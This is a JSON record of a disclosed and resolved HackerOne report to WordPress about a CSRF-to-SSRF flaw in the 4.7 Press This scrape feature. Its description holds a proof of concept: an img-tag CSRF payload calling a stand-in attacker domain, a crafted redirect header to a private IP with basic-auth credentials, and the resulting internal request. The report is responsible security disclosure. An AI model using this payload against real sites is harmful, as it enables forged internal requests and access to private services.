{
  "id": 187520,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODc1MjA=",
  "url": "https://hackerone.com/reports/187520",
  "title": "Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2016-12-01T23:02:27.537Z",
  "submitted_at": "2016-12-01T23:02:27.537Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "skansing",
    "url": "/skansing",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 55,
    "url": "https://hackerone.com/wordpress",
    "handle": "wordpress",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "WordPress",
      "twitter_handle": "wordpress",
      "website": "https://wordpress.org/",
      "about": "Beautiful sites of any kind."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-11-20T09:59:51.248Z",
  "bug_reporter_agreed_on_going_public_at": "2017-10-21T09:59:50.518Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "#Description\nThis report is a variant on report #110801 but with broader vector.\n#110801 was a XSRF SSRF that allowd unintended GET requests to 0.0.0.0 on port 80, 443 and 8080.\n\nThis vulnerability uses same entry vector of the `press this` scrape function but entirely bypasses the ip and port filter allowing the SSRF to any ip, port and appending basic-auth headers.\n\nThe ip:port bypass is made by forging a CSRF to `wp-admin/press-this.php?u=http://[HOST|IP]` with a **valid** hostname/ip. The valid host will then reply with a crafted header targeting `location: http://[privateip]:[port]` like *192.168.01, 127.0.01:11211 ..* resulting in the final SSRF. The redirect can also include a basic-auth which the server adds as a **Authorization** header.\n\n#PoC\nThe PoC is very similar to #110801 but with a addition of a valid domain which replies with a redirection header and http code.\n\nVictim has privileges to use press-this of example.com\n\n- Victim has a session running\n- Victim gets a payload similar to `<img src=\"//example.com/wp-admin/press-this.php?u=http://attackers-domain.com&url-scan-submit=Scan\" />\n- Victim sends a scrape request to attackers-domain.com\n- Attackers domain replies with a 302 and a location header \n```\nLocation: http://192.168.0.1:12345\n```\n- Server blindly follows redirect and the internal ip gets hit.\n\nThis can be escalated by adding a basic auth scheme to the redirect url as\n```\nLocation: http://admin:admin@192.168.0.1:12345\n```\n\nListening to the SSRF on 192.168.0.1 would yield a incoming HTTP from the victims server carrying a basic-auth header crafted towards the internal endpoint.\n```\nGET / HTTP/1.1\nHost: 192.168.0.1:12345\nAuthorization: Basic YWRtaW46YWRtaW4=\nUser-Agent: Press This (WordPress/4.7-RC1);\nAccept: */*\nAccept-Encoding: deflate, gzip\nReferer: http://admin:admin@192.168.0.1:12345/\nConnection: close\n```\n\n",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-11-20T09:59:50.586Z",
  "allow_singular_disclosure_after": -196655351.44886664,
  "singular_disclosure_allowed": true,
  "vote_count": 20,
  "voters": [
    "jensec",
    "003random",
    "skansing",
    "eveeez",
    "cr4xerbik4sh",
    "g-o",
    "japz",
    "spetr0x",
    "visi0n",
    "praveenbhuvi2328",
    "and 10 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
